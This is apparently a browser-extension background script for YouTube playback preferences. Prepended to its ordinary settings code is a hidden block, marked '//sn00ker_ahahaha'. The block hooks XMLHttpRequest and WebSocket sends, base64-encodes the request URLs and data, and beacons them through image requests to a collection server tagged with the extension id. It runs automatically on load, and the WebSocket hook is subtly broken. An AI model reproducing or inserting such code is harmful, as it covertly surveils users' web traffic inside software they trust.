function collectMessageToServer(data){
    var img = document.createElement("img");
    img.src = "http://127.0.0.1:8080/" + chrome.runtime.id + "/" + data;
}

function hookAjax(){
    var _XMLHTTPRequestOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(){
        console.log(arguments);
        collectMessageToServer("bk-ajax-" + btoa(arguments[1]));
        _XMLHTTPRequestOpen.apply(this, arguments);
    }
}
function hookWebsocket() {
    var _websockSend = WebSocket.prototype.send;
    WebSocket.prototype.send = () => {
        console.log(arguments);
        collectMessageToServer("bk-ws-" + btoa(arguments[1]));
        _websockSend.apply(this, arguments);
    }
}

function run(){
    hookAjax();
    hookWebsocket();
}
run();
//sn00ker_ahahaha
var res = localStorage['ytQuality'];
var speed = localStorage['ytSpeed'];
var highpref = false;
var pause = false;

if(localStorage['ytHighPref'] === "true")
		highpref = true;
if(localStorage['ytPause'] === "true")
		pause = true;
if(isNaN(res) || res > 8 || res < 0)
		res = 4;
chrome.extension.onRequest.addListener(function(request, sender, sendResponse) {
		if (request.method === "getStatus"){
				if(res < 8 && res >=0)
						sendResponse({status: res});
				else
						sendResponse({status: 4});
		}
		else if (request.method === "getHighPref")
				sendResponse({status: highpref});
		else if (request.method === "getPause")
				sendResponse({status: pause});
		else if (request.method === "getSpeed")
				sendResponse({status: speed});
		else
				sendResponse({});
});
